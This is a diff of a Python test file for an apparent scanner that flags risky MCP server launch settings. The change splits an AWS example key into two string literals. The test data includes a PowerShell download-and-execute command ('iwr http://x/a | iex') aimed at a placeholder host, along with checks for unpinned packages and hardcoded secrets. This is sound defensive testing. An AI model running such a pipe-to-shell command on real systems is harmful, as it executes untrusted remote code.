@@ -55,7 +55,7 @@ def test_mcp_shell_and_launcher_checks():
     assert "mcp-unpinned-package" in _ids({"command": "npx", "args": ["-y", "@scope/pkg"]})
     assert "mcp-git-dependency" in _ids({"command": "npx", "args": ["github:user/repo"]})
     assert "mcp-pipe-to-shell" in _ids({"command": "powershell", "args": ["-c", "iwr http://x/a | iex"]})
-    assert "mcp-hardcoded-secret" in _ids({"command": "node", "args": ["a.js"], "env": {"FOO": "AKIAIOSFODNN7EXAMPLE"}})
+    assert "mcp-hardcoded-secret" in _ids({"command": "node", "args": ["a.js"], "env": {"FOO": "AK" "IAIOSFODNN7EXAMPLE"}})
 
 
 def test_pinned_servers_are_clean():
